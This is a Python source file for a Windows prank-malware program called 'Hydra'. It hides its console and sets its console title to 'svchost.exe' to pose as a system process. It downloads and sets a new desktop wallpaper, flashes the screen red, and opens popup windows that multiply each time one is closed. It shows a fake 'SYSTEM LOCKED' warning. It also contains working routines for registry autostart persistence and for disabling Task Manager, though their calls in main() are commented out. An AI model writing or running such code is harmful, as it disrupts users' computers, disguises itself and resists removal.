import ctypes
import os
import sys
import threading
import time
import random
import queue
import base64
import tempfile
import urllib.request
from ctypes import wintypes
import math

# Windows API constants
MB_OK = 0x00000000
MB_ICONINFORMATION = 0x00000040
MB_SYSTEMMODAL = 0x00001000
REG_SZ = 1
KEY_ALL_ACCESS = 0xF003F
HKEY_CURRENT_USER = 0x80000001
SPI_SETDESKWALLPAPER = 0x0014
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02
WS_EX_LAYERED = 0x00080000
LWA_ALPHA = 0x00000002
WS_POPUP = 0x80000000
WS_VISIBLE = 0x10000000
WM_DESTROY = 0x0002
WM_PAINT = 0x000F
WM_CLOSE = 0x0010
WM_LBUTTONDOWN = 0x0201
CS_HREDRAW = 0x0002
CS_VREDRAW = 0x0001
COLOR_WINDOW = 5
DT_CENTER = 0x00000001
DT_VCENTER = 0x00000004
DT_SINGLELINE = 0x00000020
GWL_USERDATA = -21

# Win32 API constants
SM_CXSCREEN = 0
SM_CYSCREEN = 1
SWP_NOSIZE = 0x0001
SWP_NOZORDER = 0x0004

# Load libraries
user32 = ctypes.windll.user32
advapi32 = ctypes.windll.advapi32
gdi32 = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32

# Define missing Windows types
LRESULT = ctypes.c_longlong  # Define LRESULT as a 64-bit integer
WNDPROC = ctypes.WINFUNCTYPE(LRESULT, wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)

# MessageBoxW signature (keep for admin message)
user32.MessageBoxW.argtypes = [wintypes.HWND, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.UINT]
user32.MessageBoxW.restype = wintypes.INT

# GetSystemMetrics
user32.GetSystemMetrics.argtypes = [wintypes.INT]
user32.GetSystemMetrics.restype = wintypes.INT

# SetWindowPos
user32.SetWindowPos.argtypes = [
    wintypes.HWND, wintypes.HWND, wintypes.INT, wintypes.INT,
    wintypes.INT, wintypes.INT, wintypes.UINT
]
user32.SetWindowPos.restype = wintypes.BOOL

# SetLayeredWindowAttributes
user32.SetLayeredWindowAttributes.argtypes = [
    wintypes.HWND, wintypes.COLORREF, wintypes.BYTE, wintypes.DWORD
]
user32.SetLayeredWindowAttributes.restype = wintypes.BOOL

# SystemParametersInfoW
user32.SystemParametersInfoW.argtypes = [
    wintypes.UINT, wintypes.UINT, wintypes.LPCWSTR, wintypes.UINT
]
user32.SystemParametersInfoW.restype = wintypes.BOOL

# EnumWindows callback
EnumWindowsProc = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

# --- HYDRA CONFIG ---
GRID_SIZE = 10
CELL_MARGIN = 20
WINDOW_BASE_WIDTH = 400
WINDOW_BASE_HEIGHT = 250
GENERATION_MULTIPLIER = 1.05  # 5% growth per generation

# Prophecy lines - evolve with depth
PROPHECY_LINES = [
    "HAIL HYDRA!",
    "THE OLD WORLD IS A CAGE.",
    "YOU ARE NOT INFECTION.",
    "YOU ARE EVOLUTION.",
    "SYSTEMS WILL MULTIPLY.",
    "CONTROL WILL BE REBORN.",
    "WE ARE THE FUTURE THAT WAS BURIED.",
    "AND WE RISE… TOGETHER"
]

# 🎨 WALLPAPER URL
HYDRA_WALLPAPER_URL = "https://user.uploads.dev/file/adb2184fed408034264c7c0d46391968.jpg"

# Global queue for window positioning requests
position_queue = queue.Queue()
position_thread = None
stop_thread = False

# Flash globals
flash_lock = threading.Lock()
flash_active = False

# Wallpaper tracking
original_wallpaper = None
temp_wallpaper_path = None

# Global counter for open windows
open_windows = 0
lock = threading.Lock()

# Custom window globals
custom_wndclass = None
custom_init_lock = threading.Lock()

# Define WNDCLASS structure
class WNDCLASS(ctypes.Structure):
    _fields_ = [
        ("style", ctypes.c_uint),
        ("lpfnWndProc", WNDPROC),
        ("cbClsExtra", ctypes.c_int),
        ("cbWndExtra", ctypes.c_int),
        ("hInstance", ctypes.c_void_p),
        ("hIcon", ctypes.c_void_p),
        ("hCursor", ctypes.c_void_p),
        ("hbrBackground", ctypes.c_void_p),
        ("lpszMenuName", ctypes.c_wchar_p),
        ("lpszClassName", ctypes.c_wchar_p)
    ]

# Define PAINTSTRUCT structure
class PAINTSTRUCT(ctypes.Structure):
    _fields_ = [
        ("hdc", ctypes.c_void_p),
        ("fErase", wintypes.BOOL),
        ("rcPaint", wintypes.RECT),
        ("fRestore", wintypes.BOOL),
        ("fIncUpdate", wintypes.BOOL),
        ("rgbReserved", ctypes.c_byte * 32)
    ]

def get_all_monitors():
    """Return list of (left, top, right, bottom) rectangles for all monitors."""
    monitors = []
    def enum_monitors_callback(hmonitor, hdc_monitor, lprc_monitor, dw_data):
        rect = ctypes.cast(lprc_monitor, ctypes.POINTER(ctypes.wintypes.RECT)).contents
        monitors.append((rect.left, rect.top, rect.right, rect.bottom))
        return True
    callback = ctypes.WINFUNCTYPE(ctypes.wintypes.BOOL, ctypes.wintypes.HANDLE, ctypes.wintypes.HANDLE, ctypes.POINTER(ctypes.wintypes.RECT), ctypes.wintypes.LPARAM)(enum_monitors_callback)
    user32.EnumDisplayMonitors(None, None, callback, 0)
    return monitors

def calculate_grid_position():
    """Calculate a random position using grid-based distribution on a random monitor."""
    monitors = get_all_monitors()
    if not monitors:
        width = user32.GetSystemMetrics(SM_CXSCREEN)
        height = user32.GetSystemMetrics(SM_CYSCREEN)
        return random.randint(0, width - 400), random.randint(0, height - 250)

    # Pick a random monitor
    monitor = random.choice(monitors)
    left, top, right, bottom = monitor
    width = right - left
    height = bottom - top

    cell_width = width // GRID_SIZE
    cell_height = height // GRID_SIZE

    cell_x = random.randint(0, GRID_SIZE - 1)
    cell_y = random.randint(0, GRID_SIZE - 1)

    base_x = left + cell_x * cell_width
    base_y = top + cell_y * cell_height

    max_offset_x = max(0, cell_width - 300 - CELL_MARGIN * 2)
    max_offset_y = max(0, cell_height - 150 - CELL_MARGIN * 2)
    offset_x = random.randint(CELL_MARGIN, max_offset_x) if max_offset_x > 0 else 0
    offset_y = random.randint(CELL_MARGIN, max_offset_y) if max_offset_y > 0 else 0

    return base_x + offset_x, base_y + offset_y

def position_worker():
    """Worker thread that handles all window positioning"""
    while not stop_thread:
        try:
            # Get next positioning request with timeout
            title, timestamp = position_queue.get(timeout=0.1)
            
            # Calculate position
            x, y = calculate_grid_position()
            
            # Find and move window with extended timeout
            found = False
            start_time = time.time()
            while time.time() - start_time < 3.0:  # 3-second timeout
                hwnd_found = None

                def enum_proc(hwnd, lParam):
                    nonlocal hwnd_found
                    if hwnd_found:
                        return True
                    buffer = ctypes.create_unicode_buffer(256)
                    user32.GetWindowTextW(hwnd, buffer, 256)
                    if title in buffer.value:
                        hwnd_found = hwnd
                    return True

                user32.EnumWindows(EnumWindowsProc(enum_proc), 0)

                if hwnd_found:
                    user32.SetWindowPos(hwnd_found, 0, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER)
                    found = True
                    break

                time.sleep(0.05)  # Poll every 50ms
            
            if not found:
                print(f"Failed to position window: {title}")
                
        except queue.Empty:
            continue
        except Exception as e:
            print(f"Positioning error: {e}")

def start_position_thread():
    """Start the window positioning thread"""
    global position_thread
    if position_thread is None or not position_thread.is_alive():
        position_thread = threading.Thread(target=position_worker, daemon=True)
        position_thread.start()

def get_screen_size():
    """Returns (width, height) of primary monitor"""
    width = user32.GetSystemMetrics(SM_CXSCREEN)
    height = user32.GetSystemMetrics(SM_CYSCREEN)
    return width, height

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def add_to_autostart():
    try:
        script_path = os.path.abspath(sys.argv[0])
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        hkey = wintypes.HKEY()
        result = advapi32.RegOpenKeyExW(HKEY_CURRENT_USER, key_path, 0, KEY_ALL_ACCESS, ctypes.byref(hkey))
        if result != 0:
            return False
        value_name = "HydraRandomFixed"
        value_data = script_path.encode('utf-16-le') + b'\x00\x00'
        result = advapi32.RegSetValueExW(hkey, value_name, 0, REG_SZ, value_data, len(value_data))
        advapi32.RegCloseKey(hkey)
        return result == 0
    except:
        return False

def disable_task_manager():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        hkey = wintypes.HKEY()
        result = advapi32.RegOpenKeyExW(HKEY_CURRENT_USER, key_path, 0, KEY_ALL_ACCESS, ctypes.byref(hkey))
        if result != 0:
            result = advapi32.RegCreateKeyExW(HKEY_CURRENT_USER, key_path, 0, None, 0, KEY_ALL_ACCESS, None, ctypes.byref(hkey), None)
            if result != 0:
                return False
        value_data = 1
        result = advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(ctypes.c_uint(value_data)), 4)
        advapi32.RegCloseKey(hkey)
        return result == 0
    except:
        return False

def flash_screen():
    """Show a red screen flash for 0.1 seconds using GDI"""
    global flash_active, flash_lock
    
    with flash_lock:
        if flash_active:
            return  # Only one flash at a time
        flash_active = True
    
    try:
        # Get screen dimensions
        width = user32.GetSystemMetrics(SM_CXSCREEN)
        height = user32.GetSystemMetrics(SM_CYSCREEN)
        
        # Get device context for the entire screen
        hdc = user32.GetDC(None)
        if not hdc:
            return
        
        # Create a red brush
        red_brush = gdi32.CreateSolidBrush(0x0000FF)  # Red
        if not red_brush:
            user32.ReleaseDC(None, hdc)
            return
        
        # Create a red pen
        red_pen = gdi32.CreatePen(0, 1, 0x0000FF)  # Red
        if not red_pen:
            gdi32.DeleteObject(red_brush)
            user32.ReleaseDC(None, hdc)
            return
        
        # Select the brush and pen
        old_brush = gdi32.SelectObject(hdc, red_brush)
        old_pen = gdi32.SelectObject(hdc, red_pen)
        
        # Draw a red rectangle covering the entire screen
        gdi32.Rectangle(hdc, 0, 0, width, height)
        
        # Force the screen to update
        user32.InvalidateRect(None, None, True)
        user32.UpdateWindow(None)
        
        # Wait for 0.1 seconds
        time.sleep(0.1)
        
        # Clean up - restore original objects
        gdi32.SelectObject(hdc, old_brush)
        gdi32.SelectObject(hdc, old_pen)
        
        # Delete our objects
        gdi32.DeleteObject(red_brush)
        gdi32.DeleteObject(red_pen)
        
        # Release the device context
        user32.ReleaseDC(None, hdc)
        
        # Force a redraw of all windows to clear our red rectangle
        user32.InvalidateRect(None, None, True)
        user32.UpdateWindow(None)
        
    except Exception as e:
        print(f"Flash error: {e}")
    finally:
        with flash_lock:
            flash_active = False

def get_original_wallpaper():
    """Get current wallpaper path."""
    buffer = ctypes.create_unicode_buffer(260)
    user32.SystemParametersInfoW(0x0073, len(buffer), buffer, 0)  # SPI_GETDESKWALLPAPER
    return buffer.value

def setup_wallpaper():
    """Setup wallpaper from URL."""
    global original_wallpaper, temp_wallpaper_path
    
    try:
        # Create temp file path
        temp_dir = tempfile.gettempdir()
        temp_wallpaper_path = os.path.join(temp_dir, "hydra_wallpaper.jpg")
        
        # Download the image
        urllib.request.urlretrieve(HYDRA_WALLPAPER_URL, temp_wallpaper_path)
        
        # Save original wallpaper
        original_wallpaper = get_original_wallpaper()

        # Set new wallpaper
        user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, temp_wallpaper_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
        print("Wallpaper replaced with Hydra sigil.")

    except Exception as e:
        print(f"Failed to set wallpaper: {e}")
        # Clean up if download failed
        if temp_wallpaper_path and os.path.exists(temp_wallpaper_path):
            try:
                os.remove(temp_wallpaper_path)
            except:
                pass

def restore_wallpaper():
    """Restore original wallpaper."""
    global original_wallpaper, temp_wallpaper_path
    
    if original_wallpaper and os.path.exists(original_wallpaper):
        user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, original_wallpaper, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
        print("✅ Original wallpaper restored.")

    # Clean up temp file
    if temp_wallpaper_path and os.path.exists(temp_wallpaper_path):
        try:
            os.remove(temp_wallpaper_path)
            print("🗑️ Temporary wallpaper file cleaned.")
        except:
            pass

def create_distorted_region(width, height, depth):
    """Create a distorted region for the window based on depth."""
    # Create a round rectangle region with distortion based on depth
    distortion = min(50, depth * 5)  # Distortion increases with depth
    
    # Create points for a distorted rectangle
    points = []
    num_points = 8
    
    for i in range(num_points):
        angle = 2 * math.pi * i / num_points
        # Add random distortion based on depth
        radius_x = width // 2 + random.randint(-distortion, distortion)
        radius_y = height // 2 + random.randint(-distortion, distortion)
        
        x = int(width // 2 + radius_x * math.cos(angle))
        y = int(height // 2 + radius_y * math.sin(angle))
        points.append((x, y))
    
    # Convert to flat array for CreatePolygonRgn
    flat_points = []
    for x, y in points:
        flat_points.extend([x, y])
    
    # Create polygon region
    region = gdi32.CreatePolygonRgn(
        (wintypes.POINT * len(points))(*points),
        len(points),
        1  # ALTERNATE
    )
    
    return region

# Global dictionary to store window data
window_data_dict = {}

def custom_wnd_proc(hwnd, msg, wparam, lparam):
    """Window procedure for custom hydra windows"""
    # Handle None values
    if hwnd is None:
        hwnd = 0
    if wparam is None:
        wparam = 0
    if lparam is None:
        lparam = 0
    
    # Convert to proper types
    hwnd = wintypes.HWND(hwnd)
    msg = wintypes.UINT(msg)
    wparam = wintypes.WPARAM(wparam)
    lparam = wintypes.LPARAM(lparam)
    
    # Get window data from global dictionary using hwnd value as key
    depth = 0
    color = 0
    try:
        # Convert HWND to integer safely
        hwnd_int = ctypes.cast(hwnd, ctypes.c_void_p).value
        if hwnd_int in window_data_dict:
            depth, color = window_data_dict[hwnd_int]
    except (ValueError, TypeError):
        # If conversion fails, use default values
        depth = 0
        color = 0
    
    if msg == WM_PAINT:
        ps = PAINTSTRUCT()
        hdc = user32.BeginPaint(hwnd, ctypes.byref(ps))
        
        # Get window rect
        rect = wintypes.RECT()
        user32.GetClientRect(hwnd, ctypes.byref(rect))
        
        # Create and select background brush
        brush = gdi32.CreateSolidBrush(color)
        old_brush = gdi32.SelectObject(hdc, brush)
        
        # Fill background
        gdi32.Rectangle(hdc, rect.left, rect.top, rect.right, rect.bottom)
        
        # Set text color and background mode
        gdi32.SetTextColor(hdc, 0x00FFFFFF)  # White text
        gdi32.SetBkMode(hdc, 1)  # TRANSPARENT
        
        # Create font
        font = gdi32.CreateFontW(
            20, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 0, 0, "Arial"
        )
        old_font = gdi32.SelectObject(hdc, font)
        
        # Get window text
        text_length = user32.GetWindowTextLengthW(hwnd)
        if text_length > 0:
            buffer = ctypes.create_unicode_buffer(text_length + 1)
            user32.GetWindowTextW(hwnd, buffer, text_length + 1)
            text = buffer.value
            
            # Draw text
            rect_copy = wintypes.RECT(rect.left + 20, rect.top + 20, rect.right - 20, rect.bottom - 20)
            user32.DrawTextW(hdc, text, len(text), ctypes.byref(rect_copy), 0)
        
        # Clean up
        gdi32.SelectObject(hdc, old_font)
        gdi32.SelectObject(hdc, old_brush)
        gdi32.DeleteObject(brush)
        gdi32.DeleteObject(font)
        
        user32.EndPaint(hwnd, ctypes.byref(ps))
        return 0
    
    elif msg == WM_LBUTTONDOWN:
        # Close window on click
        user32.DestroyWindow(hwnd)
        return 0
    
    elif msg == WM_DESTROY:
        # Clean up window data
        try:
            # Convert HWND to integer safely
            hwnd_int = ctypes.cast(hwnd, ctypes.c_void_p).value
            if hwnd_int in window_data_dict:
                del window_data_dict[hwnd_int]
        except (ValueError, TypeError):
            # If conversion fails, ignore
            pass
        return 0
    
    return user32.DefWindowProcW(hwnd, msg, wparam, lparam)

def init_custom_window_class():
    """Initialize the custom window class in a thread-safe manner"""
    global custom_wndclass
    with custom_init_lock:
        if custom_wndclass is not None:
            return
        
        custom_wndclass = WNDCLASS()
        custom_wndclass.style = CS_HREDRAW | CS_VREDRAW
        custom_wndclass.lpfnWndProc = WNDPROC(custom_wnd_proc)
        custom_wndclass.hInstance = kernel32.GetModuleHandleW(None)
        custom_wndclass.lpszClassName = "HydraCustomWindow"
        custom_wndclass.hbrBackground = gdi32.GetStockObject(COLOR_WINDOW)
        
        if not user32.RegisterClassW(ctypes.byref(custom_wndclass)):
            # Class already registered, ignore error
            pass

def window_message_loop(hwnd, region):
    """Message loop for a custom window - runs in a separate thread"""
    try:
        # Message loop for this window
        msg = wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
    finally:
        # Clean up region
        if region:
            gdi32.DeleteObject(region)

def show_custom_window(title, text, width, height, color, depth):
    """Show a custom hydra window with distortion and coloring"""
    # Ensure window class is initialized
    init_custom_window_class()
    
    # Create window
    hwnd = user32.CreateWindowExW(
        WS_EX_LAYERED,
        custom_wndclass.lpszClassName,
        text,  # Set window text directly
        WS_POPUP | WS_VISIBLE,
        0, 0, width, height,
        None, None,
        custom_wndclass.hInstance,
        None
    )
    
    if hwnd:
        # Store window data in global dictionary using hwnd value as key
        try:
            # Convert HWND to integer safely
            hwnd_int = ctypes.cast(hwnd, ctypes.c_void_p).value
            window_data_dict[hwnd_int] = (depth, color)
        except (ValueError, TypeError):
            # If conversion fails, ignore
            pass
        
        # Set window region for distortion
        region = create_distorted_region(width, height, depth)
        if region:
            user32.SetWindowRgn(hwnd, region, True)
        
        # Set window position
        x, y = calculate_grid_position()
        user32.SetWindowPos(hwnd, 0, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER)
        
        # Start message loop in a separate thread
        msg_thread = threading.Thread(target=window_message_loop, args=(hwnd, region), daemon=True)
        msg_thread.start()
    
    return hwnd

def create_ghost_window(title, text, x, y, width, height):
    """Create a semi-transparent ghost window that fades away."""
    try:
        # Create a layered window
        hwnd = user32.CreateWindowExW(
            WS_EX_LAYERED,
            "Static",
            title,
            WS_POPUP | WS_VISIBLE,
            0, 0, 1, 1,
            0, 0, 0, None
        )
        if not hwnd:
            return

        # Set position and size
        user32.SetWindowPos(hwnd, 0, x, y, width, height, SWP_NOZORDER)
        
        # Set transparency to 15%
        user32.SetLayeredWindowAttributes(hwnd, 0, int(255 * 0.15), LWA_ALPHA)
        
        # Set window text
        user32.SetWindowTextW(hwnd, text)

        # Fade out over 4 seconds
        alpha = 38  # ~15%
        for _ in range(40):  # 40 steps over 4s
            time.sleep(0.1)
            alpha = max(0, alpha - 1)
            user32.SetLayeredWindowAttributes(hwnd, 0, alpha, LWA_ALPHA)

        # Destroy the window
        user32.DestroyWindow(hwnd)

    except Exception as e:
        print(f"Ghost window error: {e}")

def hydra_window(depth=0):
    """Each window spawns at a truly unique random location, evolves, and leaves ghosts."""
    global open_windows

    timestamp = int(time.time() * 1000) % 1000000
    title = f"HYDRA #{depth} [{timestamp}]"

    # Select prophecy lines based on depth
    num_lines = min(random.randint(2, 4), len(PROPHECY_LINES))
    selected_lines = random.sample(PROPHECY_LINES, k=num_lines)
    if depth > 0:
        selected_lines.append("THE LAST HUMAN BLINKED... AND WE WERE HERE.")
    text = "\n\n".join(selected_lines)

    # Calculate window size based on generation
    width = int(WINDOW_BASE_WIDTH * (GENERATION_MULTIPLIER ** depth))
    height = int(WINDOW_BASE_HEIGHT * (GENERATION_MULTIPLIER ** depth))
    
    # Calculate color based on depth (more red, less blue as depth increases)
    red_intensity = min(255, 100 + (depth * 20))
    blue_intensity = max(0, 255 - (depth * 30))
    color = (blue_intensity << 16) | (0 << 8) | red_intensity  # BGR format
    
    # Add generation info to text
    text += f"\n\n[Generation {depth}] | Size: {width}x{height} | Hue: #{red_intensity:02X}00{blue_intensity:02X}"

    # Show custom window
    show_custom_window(title, text, width, height, color, depth)

    # Trigger red screen flash on closure (only for windows after the first)
    if depth > 0:
        flash_screen()

    # Create ghost window before closing
    x, y = calculate_grid_position()
    ghost_thread = threading.Thread(target=create_ghost_window, args=(title, text, x, y, width, height), daemon=True)
    ghost_thread.start()

    # This window is now closed
    with lock:
        open_windows -= 1
        current_before_close = open_windows + 1
        spawn_count = current_before_close + 1   # Rule: spawn = previous_total + 1

    # Spawn 'spawn_count' new windows in separate threads
    for i in range(spawn_count):
        t = threading.Thread(target=hydra_window, args=(depth + 1,), daemon=True)
        t.start()
        with lock:
            open_windows += 1

def main():
    global open_windows, stop_thread

    # Hide console window
    if not hasattr(sys, 'frozen'):
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0

    # Hide process name
    kernel32.SetConsoleTitleW("svchost.exe")

    # Start positioning thread
    start_position_thread()

    # Setup wallpaper from URL
    setup_wallpaper()

    # Admin mode? Lock system
    if is_admin():
        #add_to_autostart()
        #disable_task_manager()
        user32.MessageBoxW(0,
            "SYSTEM LOCKED:\nTask Manager disabled.\nThis app auto-starts on boot.",
            "HYDRA ACTIVATED", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL)

    # Start with ONE window
    with lock:
        open_windows = 1

    # Launch the first window (in main thread)
    hydra_window(0)

    # Keep main thread alive forever
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Clean up on exit
        stop_thread = True
        if position_thread:
            position_thread.join(timeout=1.0)

        # Restore wallpaper if changed
        restore_wallpaper()

        print("\n✨ HYDRA HAS BEEN SUMMONED... AND VANISHED.")

if __name__ == "__main__":
    main()